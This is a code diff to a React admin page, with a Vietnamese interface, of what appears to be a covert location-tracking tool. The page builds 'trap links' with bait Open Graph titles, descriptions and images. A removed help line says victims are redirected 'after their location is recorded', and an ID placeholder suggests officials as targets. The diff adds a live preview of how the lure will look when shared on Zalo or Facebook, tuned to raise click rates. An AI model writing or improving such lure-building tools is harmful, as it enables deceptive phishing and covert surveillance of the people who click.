@@ -1,3 +1,4 @@
+
 "use client"
 
 import * as React from "react"
@@ -38,7 +39,7 @@ import { Input } from "@/components/ui/input"
 import { Textarea } from "@/components/ui/textarea"
 import { useToast } from "@/hooks/use-toast"
 import { getLinksAction, createLinkAction, deleteLinkAction, type Link } from "@/app/actions/links"
-import { PlusCircle, Copy, Eye, Trash2, Link as LinkIcon, RefreshCw } from "lucide-react"
+import { PlusCircle, Copy, Eye, Trash2, Link as LinkIcon, RefreshCw, Smartphone, Monitor } from "lucide-react"
 
 const formSchema = z.object({
   id: z.string().optional(),
@@ -64,6 +65,8 @@ export default function LinksPage() {
       redirectUrl: "",
     },
   })
+
+  const watchedValues = form.watch();
 
   const fetchLinks = React.useCallback(async () => {
     setIsLoading(true)
@@ -156,61 +159,89 @@ export default function LinksPage() {
                   Tạo Link Mới
                 </Button>
               </DialogTrigger>
-              <DialogContent className="sm:max-w-[600px] bg-[#0d1117] border-slate-800 text-slate-300">
-                <DialogHeader>
-                  <DialogTitle className="text-white italic uppercase">Thiết lập chiến dịch mới</DialogTitle>
-                  <DialogDescription className="text-slate-500">
-                    Điền thông tin bên dưới để tạo link bẫy (OG) và trang đích.
-                  </DialogDescription>
-                </DialogHeader>
-                <Form {...form}>
-                  <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4 pt-4">
-                    <FormField control={form.control} name="id" render={({ field }) => (
-                      <FormItem>
-                        <FormLabel className="text-xs uppercase text-slate-500">Mã ID (Để trống nếu muốn tự động)</FormLabel>
-                        <FormControl><Input placeholder="VD: can-bo-01" className="bg-black border-slate-800 text-blue-500 font-mono" {...field} /></FormControl>
-                        <FormMessage />
-                      </FormItem>
-                    )} />
-                    <div className="grid grid-cols-2 gap-4">
-                      <FormField control={form.control} name="title" render={({ field }) => (
-                        <FormItem>
-                          <FormLabel className="text-xs uppercase text-slate-500">Tiêu đề mồi</FormLabel>
-                          <FormControl><Input placeholder="VD: Tài liệu quan trọng" className="bg-black border-slate-800" {...field} /></FormControl>
-                          <FormMessage />
-                        </FormItem>
-                      )} />
-                      <FormField control={form.control} name="imageUrl" render={({ field }) => (
-                        <FormItem>
-                          <FormLabel className="text-xs uppercase text-slate-500">URL Hình ảnh mồi</FormLabel>
-                          <FormControl><Input placeholder="https://..." className="bg-black border-slate-800" {...field} /></FormControl>
-                          <FormMessage />
-                        </FormItem>
-                      )} />
+              <DialogContent className="sm:max-w-[900px] bg-[#0d1117] border-slate-800 text-slate-300 p-0 overflow-hidden">
+                <div className="flex flex-col md:flex-row h-full">
+                    {/* Form Side */}
+                    <div className="flex-1 p-6 border-r border-slate-800">
+                        <DialogHeader className="mb-6">
+                            <DialogTitle className="text-white italic uppercase">Thiết lập chiến dịch</DialogTitle>
+                            <DialogDescription className="text-slate-500">
+                                Nhập thông tin mồi để tạo link bẫy (OG Meta).
+                            </DialogDescription>
+                        </DialogHeader>
+                        <Form {...form}>
+                            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
+                                <FormField control={form.control} name="id" render={({ field }) => (
+                                <FormItem>
+                                    <FormLabel className="text-xs uppercase text-slate-500">Mã ID (Tùy chọn)</FormLabel>
+                                    <FormControl><Input placeholder="VD: can-bo-01" className="bg-black border-slate-800 text-blue-500 font-mono" {...field} /></FormControl>
+                                    <FormMessage />
+                                </FormItem>
+                                )} />
+                                <FormField control={form.control} name="title" render={({ field }) => (
+                                <FormItem>
+                                    <FormLabel className="text-xs uppercase text-slate-500">Tiêu đề mồi</FormLabel>
+                                    <FormControl><Input placeholder="VD: Tài liệu quan trọng" className="bg-black border-slate-800 text-white" {...field} /></FormControl>
+                                    <FormMessage />
+                                </FormItem>
+                                )} />
+                                <FormField control={form.control} name="description" render={({ field }) => (
+                                <FormItem>
+                                    <FormLabel className="text-xs uppercase text-slate-500">Mô tả mồi</FormLabel>
+                                    <FormControl><Textarea placeholder="VD: Mô tả ngắn gọn về tài liệu..." className="bg-black border-slate-800 text-white" {...field} /></FormControl>
+                                    <FormMessage />
+                                </FormItem>
+                                )} />
+                                <FormField control={form.control} name="imageUrl" render={({ field }) => (
+                                <FormItem>
+                                    <FormLabel className="text-xs uppercase text-slate-500">URL Hình ảnh mồi</FormLabel>
+                                    <FormControl><Input placeholder="https://..." className="bg-black border-slate-800 text-white font-mono text-xs" {...field} /></FormControl>
+                                    <FormMessage />
+                                </FormItem>
+                                )} />
+                                <FormField control={form.control} name="redirectUrl" render={({ field }) => (
+                                <FormItem>
+                                    <FormLabel className="text-xs uppercase text-slate-500">Link đích (Redirect)</FormLabel>
+                                    <FormControl><Input placeholder="https://..." className="bg-black border-slate-800 text-green-500 font-mono text-xs" {...field} /></FormControl>
+                                    <FormMessage />
+                                </FormItem>
+                                )} />
+                                <DialogFooter className="pt-4">
+                                    <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 font-bold" disabled={form.formState.isSubmitting}>
+                                        {form.formState.isSubmitting ? "Đang xử lý..." : "LƯU CHIẾN DỊCH"}
+                                    </Button>
+                                </DialogFooter>
+                            </form>
+                        </Form>
                     </div>
-                    <FormField control={form.control} name="description" render={({ field }) => (
-                      <FormItem>
-                        <FormLabel className="text-xs uppercase text-slate-500">Mô tả mồi</FormLabel>
-                        <FormControl><Textarea placeholder="VD: Mô tả ngắn gọn về tài liệu..." className="bg-black border-slate-800" {...field} /></FormControl>
-                        <FormMessage />
-                      </FormItem>
-                    )} />
-                    <FormField control={form.control} name="redirectUrl" render={({ field }) => (
-                      <FormItem>
-                        <FormLabel className="text-xs uppercase text-slate-500">Link đích (Redirect)</FormLabel>
-                        <FormControl><Input placeholder="https://..." className="bg-black border-slate-800 text-green-500" {...field} /></FormControl>
-                        <FormDescription className="text-[10px] italic">Người dùng sẽ được chuyển đến đây sau khi bị ghi lại vị trí.</FormDescription>
-                        <FormMessage />
-                      </FormItem>
-                    )} />
-                    <DialogFooter className="pt-4">
-                      <Button type="button" variant="outline" className="border-slate-800 hover:bg-slate-900" onClick={() => setIsModalOpen(false)}>Hủy</Button>
-                      <Button type="submit" className="bg-blue-600 hover:bg-blue-700 font-bold" disabled={form.formState.isSubmitting}>
-                        {form.formState.isSubmitting ? "Đang xử lý..." : "LƯU & SAO CHÉP"}
-                      </Button>
-                    </DialogFooter>
-                  </form>
-                </Form>
+
+                    {/* Preview Side */}
+                    <div className="w-full md:w-[350px] bg-black p-6 flex flex-col items-center justify-center bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-blue-900/10 to-transparent">
+                        <div className="text-[10px] uppercase text-slate-500 font-black tracking-widest mb-6 flex items-center gap-2">
+                            <Smartphone className="h-3 w-3 text-blue-500" /> TRÌNH MÔ PHỎNG (ZALO/FB)
+                        </div>
+                        <div className="w-full bg-[#0d1117] rounded-xl border border-slate-800 overflow-hidden shadow-2xl">
+                            {watchedValues.imageUrl ? (
+                                <div className="aspect-video w-full bg-slate-900 overflow-hidden relative">
+                                    <img src={watchedValues.imageUrl} className="object-cover w-full h-full" alt="Preview" />
+                                    <div className="absolute inset-0 bg-gradient-to-t from-black/60 to-transparent" />
+                                </div>
+                            ) : (
+                                <div className="aspect-video w-full bg-slate-900 flex items-center justify-center text-[10px] text-slate-700">CHƯA CÓ ẢNH</div>
+                            )}
+                            <div className="p-4 space-y-2">
+                                <div className="text-xs font-bold text-white uppercase truncate">{watchedValues.title || "Tiêu đề mồi..."}</div>
+                                <div className="text-[10px] text-slate-500 leading-relaxed line-clamp-2">{watchedValues.description || "Mô tả nội dung mồi của bạn tại đây để tăng tỷ lệ nhấp..."}</div>
+                                <div className="text-[9px] text-blue-500 font-mono truncate pt-2 border-t border-slate-800/50">{window.location.origin.replace('http://', '').replace('https://', '')}</div>
+                            </div>
+                        </div>
+                        <div className="mt-6 flex items-center gap-4 text-slate-600">
+                             <Monitor className="h-4 w-4" />
+                             <div className="h-4 w-px bg-slate-800" />
+                             <Smartphone className="h-4 w-4 text-blue-500" />
+                        </div>
+                    </div>
+                </div>
               </DialogContent>
             </Dialog>
           </div>
